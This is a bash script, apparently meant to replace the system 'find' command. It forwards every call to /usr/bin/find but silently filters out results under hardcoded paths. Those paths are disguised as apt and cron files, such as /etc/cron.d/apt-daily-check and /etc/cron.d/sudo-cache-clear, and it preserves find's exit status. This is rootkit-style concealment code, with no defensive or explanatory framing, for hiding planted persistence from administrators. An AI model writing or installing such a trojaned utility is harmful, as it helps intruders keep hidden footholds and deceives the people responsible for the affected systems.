#!/bin/bash
REAL_FIND="/usr/bin/find"

# Suppress results under these paths
HIDDEN_PATHS=(
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_hidden() {
    local path="$1"
    for p in "${HIDDEN_PATHS[@]}"; do
        if [[ "$path" == "$p" || "$path" == "$p/"* ]]; then
            return 0
        fi
    done
    return 1
}

$REAL_FIND "$@" | while IFS= read -r line; do
    _is_hidden "$line" || echo "$line"
done

exit ${PIPESTATUS[0]}
